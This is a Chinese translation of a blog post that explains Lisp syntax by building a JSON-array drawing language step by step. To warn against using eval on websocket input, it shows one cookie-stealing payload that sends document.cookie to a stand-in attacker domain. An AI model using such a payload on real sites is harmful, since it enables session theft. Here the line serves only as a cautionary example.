---
title: 【译】Lisp语法的直观解释
date: 2020-11-08 15:37
tags: nodejs debug inspect
---

本文翻译自[An Intuition for Lisp Syntax](https://stopa.io/post/265)

最初是在Hcakernews上看到的，觉得非常有意思，于是就忍不住翻译过来了，以下是正文。

-----

我认识的每一个Lisp程序员，包括我自己，都觉得Lisp语法里的那些括号太多了而且很奇怪。当然，这只是最开始的时候，因为很快我们就都达成了一个共识：Lisp的牛逼之处正是源自于那些括号！

在这篇文章中，我们就来仔细聊聊这个话题。

## 画图

假设我们现在正在编写一个能够让用户画图的程序。如果我们使用javascript，代码差不多就是这样：

```js
drawPoint({ x: 0, y: 1 }, 'yellow');
drawLine({ x: 0, y: 0 }, { x: 1, y: 1}, 'blue');
drawCircle(point, radius, 'red');
rotate(shape, 90);
...
```

目前看着还行。

## 挑战

现在问题来了：我们能够支持远程画图吗？

也就是让用户“发送”画图的指令到其他人的电脑，然后在他们的电脑屏幕上完成画图的过程。

怎么做呢？

很自然的想法是，我们可以建立一个websocket链接，然后可以像下面这样去接收用户的画图指令：

```js
websocket.onMessage((data) => {
  // TODO
});
```

## Eval

为了能够执行画图指令，最简单的做法就是使用eval：

```js
webSocket.onMessage((data) => {
  eval(data);
});
```

现在，用户只要发送`"drawLine({ x: 0, y: 0 }, { x: 1, y: 1 }, 'red')"`，然后，啪：一条线就画出来了！

但是。。你可能已经有一些邪恶的小想法了。如果用户不怀好意，发送的指令是一些恶意代码，比如下面这个：

```js
"window.location='http://iwillp3wn.com?user_info=' + document.cookie;"
```

啊这。。那么我们的cookie就会被立即发送到iwillp3wn.com，然后我们可能就真的被入侵了。我们不能使用eval，这太危险了。

> pwn：黑客俚语，意思是入侵、攻破或者控制

所以，现在问题来了：不能使用`eval`，我们需要另一种方式来接收画图指令。

## 最初的想法

好吧，一个最简单的想法就是使用JSON。我们可以将指令按照约定的格式组织成JSON，执行的时候调用对应的方法，这样就避免任意执行恶意代码了，就像下面这样一个JSON：

```js
{
  instructions: [
    {
      functionName: "drawLine",
      args: [{ x: 0, y: 0}, { x: 1, y: 1}, "blue" ]
    },
  ]
}
```

上面这个JSON的会被转换成`drawLine({ x: 0, y: 0 }, { x: 1, y: 1}, 'blue')`

而这个转换过程实现起来也很容易：

```js
webSocket.onMessage(({ instructions }) => {
  const fns = {
    drawLine: drawLine,
    ...
  };

  instructions.forEach((ins) => {
    fns[ins.functionName](...ins.args);
  });
});
```

看上去也还凑合！

## 一个小简化

现在让我们在回过头看看上面的过程能不能再简化一点。这是我们的JSON：

```json
{
  "instructions": [
    {
      "functionName": "drawLine",
      "args": [{ "x": 0, "y": 0}, { "x": 1, "y": 1}, "blue" ]
    },
  ]
}
```

可以看到，既然每条指令都需要一个functionName和args，那这两个就可以省略了，所以我们可以把JSON简化成这样：

```js
{
  "instructions": [
    [
      "drawLine",
      { "x": 0, "y": 0},
      { "x": 1, "y": 1},
      "blue"
    ],
  ]
}
```

太棒了，现在我们把指令换成了数组的写法，剩下的就是调整我们的指令解析器，规则很简单：每一个指令的第一项是函数名，剩下的是参数。如果我们写出来，就会是这个样子：

```js
webSocket.onMessage(({ instructions }) => {
  const fns = {
    drawLine: drawLine,
    ...
  };

  instructions.forEach(([ fName, ...args]) => {
    fns[fName](...args);
  });
})
```

啪！`drawLine`又能够正常工作了！

## 更多功能

到目前为止，我们只使用了`drawLine`：

```js
drawLine({ x: 0, y: 0 }, { x: 1, y: 1 }, 'blue');

// 等价于
["drawLine", { "x": 0, "y": 0 }, { "x": 1, "y": 1 }];
```

如果我们想支持更复杂的场景，比如：

```js
rotate(drawLine({ x: 0, y: 0 }, { x: 1, y: 1 }, 'blue'), 90);
```

似乎看上去可以转换成这样：

```json
["rotate", ["drawLine", { "x": 0, "y": 0 }, { "x": 1, "y": 1 }, "blue"], 90]
```

也就是说，`rotate`这个指令的第一个参数又是一个指令！哈，看上去很不错，而且更加不可思议的是，我们只需要稍微扩展一下之前的指令解析器就可以支持这样的写法了：

```js
webSocket.onMessage(({ instructions }) => {
  const fns = {
    drawLine: drawLine,
    ...
  };

  const parseInstruction = (ins) => {
    if (!Array.isArray(ins)) {
      // 这正情况下，ins一定是原始的参数，例如 { x: 0, y: 0 }
      return ins;
    }

    const [fName, ...args] = ins;
    return fns[fName](...args.map(parseInstruction));
  };

  instructions.forEach(parseInstruction);
})
```

这里，我们新增了一个叫`parseInstruction`的函数，通过对参数进行递归调用，我们现在就可以支持下面这种指令了：

```json
["rotate", ["rotate", ["drawLine", { "x": 0, "y": 0 }, { "x": 1, "y": 1 }, "blue"], 90], 45]
```

针不戳！

## 再简化一点

好了，现在让我们再看看我们的JSON：

```json
{ "instructions": [["drawLine", { "x": 0, "y": 0 }, { "x": 1, "y": 1 }, "blue"]] }
```

嗯，既然JSON对象中只包含instructions这一个key，那我们是不是可以把它省略掉呢？

假如我们这样做：

```json
["do", ["drawLine", { "x": 0, "y": 0 }, { "x": 1, "y": 1 }]]
```

这里我们将那个冗长的instructions替换成了一个特殊的命令叫做`do`，意思是执行后续所有的命令。

现在我们只需要再稍微调整一下我们的解析器：

```js
webSocket.onMessage((instructions) => {
  const fns = {
    ...,
    // do总是会将最后一个命令得到的结果作为返回值
    do: (...args) => args[args.length - 1],
  };

  const parseInstruction = (ins) => {
    if (!Array.isArray(ins)) {
      // 此时一定是原始类型，例如 { x: 0, y: 0 }
      return ins;
    }
    const [fName, ...args] = ins;
    return fns[fName](...args.map(parseInstruction));
  };

  parseInstruction(instructions);
})
```

wow，挺容易的。我们只是在`fns`里添加了`do`的定义。现在我们可以支持下面这样的命令了：

```json
[
  "do",
  ["drawPoint", { "x": 0, "y": 0 }],
  ["rotate", ["drawLine", { "x": 0, "y": 0 }, { "x": 1, "y": 1 }], 90]
]
```

## 更牛啤一点

现在更有意思的来了，假如我们想支持**变量定义**，行不行呢？

```js
const shape = drawLine({ x: 0, y: 0 }, { x: 1, y: 1 });
rotate(shape, 90);
```

如果我们能够支持变量定义，那么用户就可以实现一些高级命令了！首先让我们将上面的代码转换成之前我们使用的JSON：

```json
["def", "shape", ["drawLine", { "x": 0, "y": 0 }, { "x": 1, "y": 1 }]]
["rotate", "shape", 90]
```

还不戳！如果我们可以支持上面的命令，那我们就碉堡了！看下面：

```js{2}
webSocket.onMessage((instructions) => {
  const variables = [];
  const fns = {
    ...,
    def: (name, v) => {
      variables[name] = v;
    },
  };

  const parseInstruction = (ins) => {
    if (variables[ins]) {
      // 此时对应变量，比如 shape
      return variables[ins];
    }
    if (!Array.isArray(ins)) {
      // 此时一定是原始类型，例如 { x: 0, y: 0 }
      return ins;
    }

    const [fName, ...args] = ins;
    return fns[fName](...args.map(parseInstructions));
  };

  parseInstruction(instructions);
});
```

在第二行我们引入了一个`variables`的对象，用来保存每个我们定义的变量。`def`函数的作用就是更新`variables`对象。现在我们可以运行下面的命令了：

```json
[
  "do",
  ["def", "shape", ["drawLine", { "x": 0, "y": 0 }, { "x": 1, "y": 1 }]],
  ["rotate", "shape", 90],
];
```

针不戳！

## 无敌牛啤：目标

现在让我们更上一层楼。如果我们能够让远程用户自定义他们自己的函数呢？

比方说他们想做到这样的效果：

```js
const drawTriangle = function(left, top, right, color) { 
   drawLine(left, top, color);
   drawLine(top, right, color); 
   drawLine(left, right, color); 
} 
drawTriangle(...);
```

要怎么做呢？同样地让我们回到我们最初的想法，首先将上面的js转换成JSON命令的格式，下面是转换后的样子：

```json
["def", "drawTriangle",
  ["fn", ["left", "top", "right", "color"],
    ["do",
      ["drawLine", "left", "top", "color"],
      ["drawLine", "top", "right", "color"],
      ["drawLine", "left", "right", "color"],
    ],
  ],
],
["drawTriangle", { "x": 0, "y": 0 }, { "x": 3, "y": 3 }, { "x": 6, "y": 0 }, "blue"],
```

这里我们将

```js
const drawTriangle = ...
```

转换成了：

```json
["def", "drawTriangle", ...]
```

以及我们将

```js
function(left, top, right, color) { ... }
```

转换成了：

```json
["fn", ["left", "top", "right", "color"], ["do" ...]]
```

那么现在我们剩下的工作就是试着支持这些命令了，看上去也不那么困难嘛。

## 无敌牛啤：关键

实现上述目标的关键在于支持`["fn", ...]`这个命令。我们可以这样：

```js
const parseFnInstruction = (args, body, oldVariables) {
  return (...values) => {
    const newVariables = {
      ...oldVariables,
      ...mapArgsWithValues(args, values),
    };
    return parseInstruction(body, newVariables);
  };
};
```

当我们遇到`fn`命令的时候，我们就去执行`parseFnInstruction`，这个函数将会得到一个新的函数。

之前我们调用`drawTriangle`函数是这样的：

```json
["drawTriangle", { "x": 0, "y": 0 }, { "x": 3, "y": 3 }, { "x": 6, "y": 0 }, "blue"]
```

当`parseFnInstruction`执行后，`values`就会变成：

```js
[{ x: 0, y: 0 }, { x: 3, y: 3 }, { x: 6, y: 0 }, "blue"]
```

然后，

```js
const newVariables = {...oldVariables, ...mapArgsWithValues(args, values)}
```

这里将会创造一个新的`variables`对象，它包含了从函数参数到最新的values的字典：

```js
const newVariables = {
  ...oldVariables,
  left: { x: 0, y: 0 }, 
  top: { x: 3, y: 3 },
  right: {x: 6, y: 0 }, 
  color: "blue", 
}
```

然后，我们就可以去执行函数体了，这个例子是这样：

```json
[
  "do",
  ["drawLine", "left", "top", "color"],
  ["drawLine", "top", "right", "color"],
  ["drawLine", "left", "right", "color"],
],
```

`parseInstruction`在执行的时候，可以从`newVariables`中正确拿到`"left"`变量的值`{ x: 0, y: 0}`，其他的部分同理。

如果我们做到上面这些，哈，支持函数定义的大部分工作就算是做完了！

## 无敌牛啤：执行

让我们再回顾一下我们的计划。首先，我们需要让`parseInstruction`接受`variables`作为参数。为了做到这一点，我们需要修改一下`parseInstruction`：

```js
const parseInstruction = (ins, variables) => {
  ...
  return fn(...args.map((arg) => parseInstruction(arg, variables)));
}

parseInstruction(instruction, variables);
```

接下来，我们需要判断一下是否我们遇到了函数定义“fn”命令：

```js
const parseInstruction = (ins, variables) => {
  ...
  const [fName, ...args] = ins;

  if (fName === 'fn') {
    return parseFnInstruction(...args, variables);
  }

  ...

  return fn(...args.map((arg) => parseInstruction(arg, variables)));
};

parseInstruction(instruction, variables);
```

下面就是我们的`parseFnInstruction`：

```js
const mapArgsWithValues = (args, values) => {
  return args.reduce((res, k, idx) => {
    res[k] = values[idx];
    return res;
  }, {});
};

const parseFnInstruction = (args, body, oldVariables) => {
  return (...values) => {
    const newVariables = { ...oldVariables, ...mapArgsWithValues(args, values) };
    return parseInstruction(body, newVariables);
  };
};
```

就像我们之前说的，`parseFnInstruction`将返回一个新的函数。实际上它做了两件事：

1. 创建一个`newVariables`对象，构造`args`和`values`的字典。
2. 将`body`和构造出来的新的`newVariables`传入`parseInstruction`。

好了，到此差不多就做完了。最终的代码如下所示：

```js
const parseInstruction = (ins, variables) => {
  ...

  const [fName, ...args] = ins;
  if (fName === 'fn') {
    return parseFnInstruction(...args, variables);
  }

  const fn = fns[fName] || variables[fName];
  return fn(...args.map((arg) => parseInstruction(arg, variables)));
};
```

支持函数定义的秘诀在于：

```js
const fn = fns[fName] || variables[fName];
```

因为我们会从`fns`和`variables`中获取`fn`的定义。最后把其他部分也加上，it works！

```js
webSocket.onMessage((instructions) => {
  const variables = {};
  const fns = {
    drawLine,
    drawPoint,
    rotate,
    do: (...args) => args[args.length - 1],
    def: (name, v) => {
      variables[name] = v;
    },
  };
  const mapArgsWithValues = (args, values) => {
    return args.reduce((res, k, idx) => {
      res[k] = values[idx];
      return res;
    }, {});
  };
  const parseFnInstruction = (args, body, oldVariables) => {
    return (...values) => {
      const newVariables = {
        ...oldVariables,
        ...mapArgsWithValues(args, values),
      };
      return parseInstruction(body, newVariables);
    };
  };
  const parseInstruction = (ins, variables) => {
    if (variables[ins]) {
      return variables[ins];
    }
    if (!Array.isArray(ins)) {
      return ins;
    }
    const [fName, ...args] = ins;
    if (fName === 'fn') {
      return parseFnInstruction(...args, variables);
    }
    const fn = fns[fName] || variables[fName];
    return fn(...args.map((arg) => parseInstruction(arg, variables)));
  };

  parseInstruction(instructions, variables);
});
```

我滴娘，有了上面的代码，我们现在可以解析这种命令了：

```json
[
  "do",
  [
    "def",
    "drawTriangle",
    [
      "fn",
      ["left", "top", "right", "color"],
      [
        "do",
        ["drawLine", "left", "top", "color"],
        ["drawLine", "top", "right", "color"],
        ["drawLine", "left", "right", "color"],
      ],
    ],
  ],
  ["drawTriangle", { "x": 0, "y": 0 }, { "x": 3, "y": 3 }, { "x": 6, "y": 0 }, "blue"],
  ["drawTriangle", { "x": 6, "y": 6 }, { "x": 10, "y": 10 }, { "x": 6, "y": 16 }, "purple"],
])
```

我们可以组合函数，我们可以定义变量，我们甚至可以创造自定义的函数！如果仔细想想，这不就是创造了一个编程语言吗！

## 试试看

这就是上面的绘制三角形的例子🙂

[点击](https://jsfiddle.net/xn3tkdhL/3/)

还有一个快乐的小人的例子

[点击](https://jsfiddle.net/xn3tkdhL/2/)

## 惊喜

由于我们发明的编程函数总是在执行JSON数组，那么不妨将它命名为数组语言吧。

而且，它在某些方面要比Javascirpt更好！往下看：

## 没什么特殊的

在Javascript中，我们使用`const x = foo`定义变量。假设你想把`const`重新定义成`c`，你是做不到的，因为`const x = foo`是Javascript中定义变量的特定语法。你是不能修改语法的。

但是在我们发明的数组语言中，我们是可以做到的，因为压根就没有任何语法！任何东西都是数组。所以你可以很轻松地用`c`替换掉任何命令，比如`def`。

打个比方，使用Javascirpt编程时，我们是客人，我们需要遵循语言设计者规定的各种规则。但是咱我们的数组语言中，我们是“联合创始人”。语言“内置”的东西（“def”，“fn”）跟用户自己写的内容没有本质上的不同！（“drawTriangle”）。

## Code is Data

此外，还有一个特别的优势。想想看，我们的代码就是一堆数组而已，所以我们可以很容易地用代码生成代码！

比如，如果我们想在Javascript中支持`unless`这个语法：

```js
unless(foo) {
  ...
}
```

等价于这样的形式：

```js
if (!foo) {
  ...
}
```

这当然是可行的，但是要麻烦得多。我们得需要借助Babel去解析文件，遍历AST然后去改写生成对应的代码：

```js
if (!foo) {
  ...
}
```

但是在我们的数组语言中，代码本身只不过是数组而已！所以要想支持`unless`简直不要太简单：

```js
function rewiteUnless(unlessCode) {
  const [_unlessInstructionName, testCondition, consequent] = unlessCode;
  return ["if", ["not", testCondition], consequent];
}
```

```js
rewriteUnless(["unless", ["=", 1, 1], ["drawLine"]])
// =>
["if", ["not", ["=", 1, 1]], ["drawLine"]];
```

轻松加愉快。

## Structual editing

代码就是数据，不仅可以让我们更容易地操纵代码，还可以让编辑器更方便地造作。比如，如果你在编辑下面的代码：

```js
["if", testCondition, consequent]
```

你想把`testCondition`替换成`["not", testCondition]`。

你可以将光标移动至`testCondition`前面：

```js
["if", |testCondition, consequent]
```

然后创建一个数组：

```js
["if", [|] testCondition, consequent]
```

然后输入“not”：

```js
["if", ["not", |] testCondition, consequent]
```

如果你的编辑器能够理解这些数组，那么你可以让编辑器将`]`向右异动一层：

```js
["if", ["not", testCondition], consequent]
```

看，编辑器可以很容易地帮你修改代码的结构。

如果你想撤销这个改动，你可以把光标放在`testCondition`旁边，

```js
["if", ["not", |testCondition], consequent]
```

然后让编辑器“撤销”一个层级：

```js
["if", testCondition, consequent]
```

一瞬间，编辑器就可以完成这一切，不需要输入额外的字符。这就叫做structual editing。它可以帮助你提高编程效率，而这是code is data带来的若干好处之一。

## 我们发现了什么？

emmm，我们刚才发明的数组语言。。实际上可以看作是Lisp的一个方言！

这是我们最复杂的例子：

```json
[
  "do",
  [
    "def",
    "drawTriangle",
    [
      "fn",
      ["left", "top", "right", "color"],
      [
        "do",
        ["drawLine", "left", "top", "color"],
        ["drawLine", "top", "right", "color"],
        ["drawLine", "left", "right", "color"],
      ],
    ],
  ],
  ["drawTriangle", { "x": 0, "y": 0 }, { "x": 3, "y": 3 }, { "x": 6, "y": 0 }, "blue"],
  ["drawTriangle", { "x": 6, "y": 6 }, { "x": 10, "y": 10 }, { "x": 6, "y": 16 }, "purple"],
])
```

如果用Clojure（一种Lisp的方言）写出来是这样：

```clojure
(do 
  (def draw-triangle (fn [left top right color]
                       (draw-line left top color)
                       (draw-line top right color)
                       (draw-line left right color)))
  (draw-triangle {:x 0 :y 0} {:x 3 :y 3} {:x 6 :y 0} "blue")
  (draw-triangle {:x 6 :y 6} {:x 10 :y 10} {:x 6 :y 16} "purple"))
```

区别其实不大，仅有下面这些：

- `()`现在表示数组
- 去掉了逗号
- 驼峰命名（camelCase）变成了烤串命名（kebab-case）
- 将所有的`string`替换成了一种新的数据类型`symbol`。比如将`"drawTriangle"`变成了`draw-triangle`

剩下的规则都是一样的：

```clojure
(draw-line left top color)
```

意思是

- 计算`left`，`top`，`color`这些变量的值
- 用上面的参数调用`draw-line`这个函数

## 发现？

什么样的编程语言最有利于操纵源代码（元编程）呢？

上面的问题，其实可以转换成：我们怎么能够让操纵代码就像操纵数据那样直观简单呢？答案很显然了，就是让代码就是数据！如果我们需要操纵代码，那么代码必须是数据！

如果代码必须是数据，那么我们可以使用什么样的数据结构呢？XML也许可以，JSON也许也可以，等等等等。但如果我们想找到一个最简单的结构，那么答案将是：数组！

这个结论很有启发性，也很令人激动。

说很有启发性，是因为这就好像是我们重新“发明”了Lisp。如果你想操纵代码，那么结果就是你一定会发明Lisp！就好像是发现万有引力重力一样自然。如果有外星人，那么他们也一定在使用Lisp！

说令人激动，是因为要支持元编程，上述语法或许还可以进一步改进。印象中Ruby和Python就是在尝试既保留Lisp的元编程能力又想把括号去掉。我不认为这个问题就到此被解决了。也许你可以想出更好的办法。🙂

## 最后

如果你可以改写编程语言，可以想象这会极大丰富语言的表达能力。你将会真正地跟语言的设计者平起平坐，拥有更高级的抽象能力，可以节省大量的工作时间。

突然，你发现，那些括号看着还蛮酷的！

